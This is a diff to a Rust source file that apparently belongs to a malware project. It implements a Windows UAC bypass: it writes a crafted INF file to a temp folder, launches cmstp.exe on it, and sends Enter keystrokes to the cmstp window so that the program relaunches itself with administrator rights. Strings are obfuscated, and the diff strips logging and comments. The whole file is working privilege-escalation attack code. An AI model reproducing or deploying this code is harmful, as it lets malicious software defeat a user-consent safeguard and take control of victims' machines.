@@ -1,13 +1,10 @@
 // https://oddvar.moe/2017/08/15/research-on-cmstp-exe/
-
-//! CLEAN UP - temp path etc
-use tempfile::{ NamedTempFile, tempdir };
 use anyhow::{ anyhow, Context, Result };
 use obfstr::obfstr as s;
 use std::fs::create_dir_all;
 use std::io::Write;
 use std::path::PathBuf;
-use std::ptr;
+use std::{ env, ptr };
 use std::time::Duration;
 use std::{ fs, time::Instant };
 use winapi::{
@@ -30,7 +27,6 @@ use winapi::{
         },
     },
 };
-
 use crate::utils::functions::get_current_exe;
 
 pub struct WindowInfo {
@@ -40,14 +36,16 @@ pub struct WindowInfo {
 
 fn _clean_up_uac(tmp_path: &PathBuf) -> Result<()> {
     fs::remove_file(tmp_path).context(s!("Failed to remove temp file").to_string())?;
-    // info!("Cleaned up temporary file: ", tmp_path);
     Ok(())
 }
 
 pub fn shell_execute(tmp_path: &PathBuf, show_window: bool) -> Result<()> {
-    // info!("Executing shell command with temporary file: ", tmp_path);
-    let payload = s!("cmstp.exe").to_string();
-    let params = format!("{}{}", s!("/au "), tmp_path.to_string_lossy().to_string());
+    let payload = s!("cmstp.exe").to_owned();
+    let params = format!(
+        "{}{}",
+        s!("/au "),
+        tmp_path.to_str().context(s!("Failed to convert tmp_path to str").to_string())?.to_owned()
+    );
 
     let payload_wide: Vec<u16> = payload.encode_utf16().chain(std::iter::once(0)).collect();
     let params_wide: Vec<u16> = params.encode_utf16().chain(std::iter::once(0)).collect();
@@ -79,13 +77,10 @@ pub fn shell_execute(tmp_path: &PathBuf, show_window: bool) -> Result<()> {
     if !success {
         return Err(anyhow!(s!("Failed to open Service Control Manager").to_string()));
     }
-
-    // info!("Shell command executed successfully");
     Ok(())
 }
 
 pub fn execute_as_admin_cmstp_method(command: &str) -> Result<()> {
-    // info!("Executing command as administrator: ", command);
     let inf_template = format!(
         "{}{}{}",
         s!(
@@ -116,53 +111,43 @@ ShortSvcName="Connect"
 "#
         )
     );
-    // info!("Generated INF template: \n", inf_template);
+    let temp_file_dir = env::temp_dir().join(s!("temp_1972449")).join(s!("cache"));
 
-    // create_dir_all(&end_directory).context(s!("Failed to CREATE DIR ALL FOR path").to_string())?;
+    create_dir_all(&temp_file_dir).context(
+        s!("Failed to create_dir_all FOR temp_file_dir").to_string()
+    )?;
 
-    // tmp_file_path.push(s!("tmp.ini"));
-    // // info!("Temporary file path: ", tmp_file_path);
+    let tmp_file_path = temp_file_dir.join(s!("tmp.ini"));
 
-    // let mut tmp_file = std::fs::File::create(&tmp_file_path)?;
+    let mut tmp_file = std::fs::File
+        ::create(&tmp_file_path)
+        .context(s!("Failed to create tmp.ini").to_string())?;
 
-    // // info!("Created temporary file");
-
-    // // Write to the temporary file
-    // NamedTempFile.write(&inf_template.as_bytes()).context(
-    //     s!("Failed to write to temporary file").to_string()
-    // )?;
-
-    // info!("Wrote to temporary file");
+    tmp_file.write(&inf_template.as_bytes()).context(s!("Failed to write to tmp.ini").to_string())?;
 
     shell_execute(&tmp_file_path, false).context(s!("Failed to shell_execute").to_string())?;
-    // info!("Executed shell command");
 
     let start_time = Instant::now();
-    let timeout = Duration::from_secs(15); // 10 seconds timeout
+    let timeout = Duration::from_secs(15);
 
     loop {
         let sent = send_key_to_exe(s!("cmstp.exe"));
         if sent {
-            // info!("Sent key to cmstp.exe");
             break;
         }
 
         if start_time.elapsed() > timeout {
-            // err!("Timeouted while trying to send key to cmstp.exe");
             break;
         }
-        // thread::sleep(std::time::Duration::from_millis(100));
     }
 
     Ok(())
 }
 
 pub fn open_self_as_admin() -> Result<()> {
-    // info!("Running self as administrator");
     let binding = get_current_exe();
     let curent_executable = binding.to_str().unwrap();
 
-    // info!("Current executable: ", curent_executable);
     execute_as_admin_cmstp_method(curent_executable).context(
         s!("failed to execute as admin").to_string()
     )?;
@@ -170,7 +155,6 @@ pub fn open_self_as_admin() -> Result<()> {
 }
 
 pub fn find_window_by_exe(exe_name: &str) -> Option<HWND> {
-    // info!("searching for window by exe: ", exe_name);
     let mut info_data = WindowInfo {
         name: exe_name.to_string(),
         hwnd: ptr::null_mut(),
@@ -180,10 +164,8 @@ pub fn find_window_by_exe(exe_name: &str) -> Option<HWND> {
         EnumWindows(Some(enum_window), &mut info_data as *mut WindowInfo as LPARAM);
 
         if !info_data.hwnd.is_null() {
-            // info!("Found window with handle: ", &info_data.hwnd);
             Some(info_data.hwnd)
         } else {
-            // warn!("Failed to find window");
             None
         }
     }
@@ -192,11 +174,9 @@ pub fn find_window_by_exe(exe_name: &str) -> Option<HWND> {
 unsafe extern "system" fn enum_window(hwnd: HWND, lparam: LPARAM) -> BOOL {
     let info_data = &mut *(lparam as *mut WindowInfo);
 
-    // Get process ID for this window
     let mut process_id: DWORD = 0;
     GetWindowThreadProcessId(hwnd, &mut process_id);
 
-    // Open the process
     let process_handle = OpenProcess(
         PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
         FALSE,
@@ -213,30 +193,24 @@ unsafe extern "system" fn enum_window(hwnd: HWND, lparam: LPARAM) -> BOOL {
         ) as usize;
 
         if len > 0 {
-            // Convert path to string and get exe name
             let path = String::from_utf8_lossy(&exe_path[..len]).to_string();
             let found_exe = path.split('\\').last().unwrap_or("").to_lowercase();
 
-            // Compare with target exe name
             if found_exe == info_data.name.to_lowercase() {
-                // info!("Found matching executable: ", found_exe);
                 info_data.hwnd = hwnd;
-                return FALSE; // Stop enumeration, we found it
+                return FALSE;
             }
         }
     }
 
-    TRUE // Continue enumeration
+    TRUE
 }
 
-// Function to both find window and send key
 pub fn send_key_to_exe(exe_name: &str) -> bool {
-    // // info!("Sending key to executable: {}", exe_name));
     if let Some(hwnd) = find_window_by_exe(exe_name) {
         unsafe {
             PostMessageA(hwnd, WM_KEYDOWN, VK_RETURN as usize, 0);
             PostMessageA(hwnd, WM_KEYUP, VK_RETURN as usize, 0);
-            // info!("Sent key to window with handle: ", hwnd);
             return true;
         }
     }
